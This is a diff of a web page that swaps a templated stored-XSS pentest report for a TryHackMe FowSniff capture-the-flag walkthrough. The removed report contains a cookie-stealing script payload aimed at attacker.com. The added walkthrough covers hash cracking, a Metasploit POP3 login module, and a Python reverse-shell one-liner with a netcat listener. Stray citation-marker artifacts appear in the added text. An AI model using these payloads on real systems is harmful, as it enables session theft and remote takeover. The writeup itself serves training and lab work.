@@ -112,78 +112,65 @@
 </section>
 
 <!-- Writeup content -->
-<article class="markdown-body"><h1>Penetration Testing Writeup: XSS in Admin Panel</h1>
-<h2>Executive Summary</h2>
-<p>A Stored Cross-Site Scripting (XSS) vulnerability was found in [Target
-Application]’s admin panel during a penetration test. This allows attackers to
-inject scripts into admin inputs, affecting admin users. This report details the
-issue and remediation steps.</p>
-<h2>Vulnerability Details</h2>
+<article class="markdown-body"><h1>TryHackMe | FowSniff CTF Writeup</h1>
+<p>This writeup documents the steps taken to solve the <strong>FowSniff</strong> machine on TryHackMe.<br>The challenge involves reconnaissance, OSINT investigation, credential cracking, and privilege escalation to obtain root access. :contentReference[oaicite:0]{index=0}</p>
+<hr>
+<h2>Challenge Information</h2>
 <ul>
-<li><strong>Vulnerability Type</strong>: Cross-Site Scripting (XSS) - Stored</li>
-<li><strong>Severity</strong>: Critical</li>
-<li><strong>Affected Component</strong>: Admin note field</li>
-<li><strong>CWE</strong>: CWE-79 (Improper Neutralization of Input During Web Page Generation)</li>
-<li><strong>Location</strong>: <code>https://[target-application]/admin/notes</code></li>
-<li><strong>Discovered By</strong>: [PenTester Name]</li>
-<li><strong>Date Discovered</strong>: August 30, 2025</li>
+<li><strong>Platform:</strong> TryHackMe  </li>
+<li><strong>Room:</strong> FowSniff  </li>
+<li><strong>Category:</strong> Boot2Root / Linux  </li>
+<li><strong>Difficulty:</strong> Beginner</li>
 </ul>
-<h3>Description</h3>
-<p>The admin note field does not sanitize inputs before storing and displaying
-them, allowing script execution in the admin panel.</p>
-<h3>Impact</h3>
+<hr>
+<h2>Recon</h2>
+<p>The first step was performing a port and service scan on the target machine.</p>
+<pre><code class="language-bash">nmap -sV -vv &lt;target-ip&gt;
+</code></pre>
+<p>The scan revealed several open services, including:</p>
 <ul>
-<li><strong>Admin Account Takeover</strong>: Admin cookies can be stolen.</li>
-<li><strong>Data Exfiltration</strong>: Admin data can be sent to attackers.</li>
-<li><strong>Phishing</strong>: Fake forms can capture admin credentials.</li>
-<li><strong>System Compromise</strong>: Admin access can lead to full system control.</li>
+<li><code>22/tcp</code> — SSH  </li>
+<li><code>80/tcp</code> — HTTP  </li>
+<li><code>110/tcp</code> — POP3  </li>
+<li><code>143/tcp</code> — IMAP</li>
 </ul>
-<h3>Proof of Concept</h3>
-<ol>
-<li>In the admin panel, add a note: <code>&lt;script&gt;alert(&#39;Stored XSS&#39;);&lt;/script&gt;</code>.</li>
-<li>View the note and observe the alert.</li>
-<li>Malicious payload:
-<code>&lt;script&gt;fetch(&#39;https://attacker.com/steal?cookie=&#39;+document.cookie);&lt;/script&gt;</code>.</li>
-</ol>
-<h3>Steps to Reproduce</h3>
-<ol>
-<li>Log in to <code>https://[target-application]/admin/notes</code>.</li>
-<li>Add a note with <code>&lt;script&gt;alert(&#39;Stored XSS&#39;);&lt;/script&gt;</code>.</li>
-<li>View the note to confirm the alert.</li>
-</ol>
-<h2>Remediation Recommendations</h2>
-<ol>
-<li><strong>Input Sanitization</strong>:<ul>
-<li>Use OWASP AntiSamy for note inputs.</li>
-</ul>
-</li>
-<li><strong>Output Encoding</strong>:<ul>
-<li>Encode notes before rendering.</li>
-</ul>
-</li>
-<li><strong>Content Security Policy</strong>:<ul>
-<li>Apply CSP: <code>Content-Security-Policy: script-src &#39;self&#39;;</code>.</li>
-</ul>
-</li>
-<li><strong>Secure Development</strong>:<ul>
-<li>Train admins and developers on XSS prevention.</li>
-</ul>
-</li>
-<li><strong>Security Testing</strong>:<ul>
-<li>Conduct regular audits.</li>
-</ul>
-</li>
-</ol>
-<h2>Conclusion</h2>
-<p>The Stored XSS vulnerability in [Target Application]’s admin panel is critical
-and requires immediate remediation.</p>
-<h2>References</h2>
-<ul>
-<li>OWASP XSS Prevention Cheat Sheet:
-<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
-<li>CWE-79: <a href="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</a></li>
-</ul>
-<p><img src="https://example.com/images/admin-xss-example.png" alt="Admin XSS Example"></p>
+<p>The presence of mail services suggested that email accounts might be used as an entry point. :contentReference[oaicite:1]{index=1}</p>
+<p>Next, the website hosted on port 80 was inspected. The page indicated that <strong>FowSniff Corporation had experienced a data breach</strong>, and the message referenced a hijacked Twitter account. :contentReference[oaicite:2]{index=2}</p>
+<hr>
+<h2>Enumeration</h2>
+<p>The site referenced the company&#39;s Twitter handle: <code>@fowsniffcorp</code>.</p>
+<p>Investigating the account revealed a link to a Pastebin file containing leaked credentials. The original link may no longer work, but it can be accessed through archived snapshots.</p>
+<p>The Pastebin contained <strong>usernames and MD5 password hashes</strong> belonging to employees. :contentReference[oaicite:3]{index=3}</p>
+<p>These hashes were cracked using an online hash cracking service such as <strong>CrackStation</strong>.</p>
+<p>After cracking the hashes, several plaintext credentials were obtained.</p>
+<hr>
+<h2>Exploitation</h2>
+<p>Since POP3 was exposed on port <code>110</code>, the next step was attempting to authenticate to the mail service using the discovered credentials.</p>
+<p>Metasploit can be used to brute-force POP3 logins.</p>
+<pre><code>use auxiliary/scanner/pop3/pop3_login
+</code></pre>
+<p>After configuring the module with the target host and credential list, valid login credentials were discovered. :contentReference[oaicite:4]{index=4}</p>
+<p>Once authenticated, the mailbox contents were inspected. One of the emails contained a <strong>temporary password</strong> for another user account.</p>
+<p>This password was used together with the sender’s username to authenticate to the machine via SSH.</p>
+<pre><code class="language-bash">ssh &lt;username&gt;@&lt;target-ip&gt;
+</code></pre>
+<p>This provided a shell on the target machine.</p>
+<hr>
+<h2>Privilege Escalation</h2>
+<p>After gaining access to the system, the next step was identifying privilege escalation opportunities.</p>
+<p>The user’s group memberships were inspected:</p>
+<pre><code class="language-bash">groups
+</code></pre>
+<p>One of the groups had permission to modify a script that runs automatically on the system.</p>
+<p>Since the file was writable by the user’s group, the script could be modified to include a <strong>reverse shell payload</strong>.</p>
+<p>Example Python reverse shell:</p>
+<pre><code class="language-bash">python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lt;attacker-ip&gt;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;
+</code></pre>
+<p>After starting a listener on the attacker machine:</p>
+<pre><code class="language-bash">nc -lvnp 1234
+</code></pre>
+<p>The modified script executed and triggered the reverse shell, providing <strong>root-level access</strong> to the system.</p>
+<p>The final flag could then be retrieved from the root directory.</p>
 </article>
 
 			<!-- Footer -->
